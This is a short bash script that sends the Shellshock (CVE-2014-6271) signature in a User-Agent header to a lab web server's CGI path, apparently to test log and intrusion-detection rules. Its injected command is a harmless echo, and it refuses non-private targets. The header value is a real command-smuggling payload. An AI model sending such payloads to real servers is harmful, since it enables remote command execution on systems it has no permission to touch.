#!/usr/bin/env bash
# Sends the classic CVE-2014-6271 *signature* in a User-Agent header to a LAB web server.
# Payload is a harmless 'echo'; it only exercises web-log/IDS detections.
# Usage: shellshock_probe.sh <host> [port=80] [path=/cgi-bin/test.cgi]
HOST="${1:?host required}"; PORT="${2:-80}"; URLPATH="${3:-/cgi-bin/test.cgi}"

# Safety: lab use only. Refuse anything that is not a private/loopback address.
case "$HOST" in
  127.*|10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[01].*|localhost) ;;
  *) echo "refusing non-lab target: $HOST" >&2; exit 64 ;;
esac
curl -s -o /dev/null -m 10 -A '() { :; }; echo dv-shellshock-probe' "http://$HOST:$PORT$URLPATH" || true
echo "probe sent to $HOST:$PORT$URLPATH"
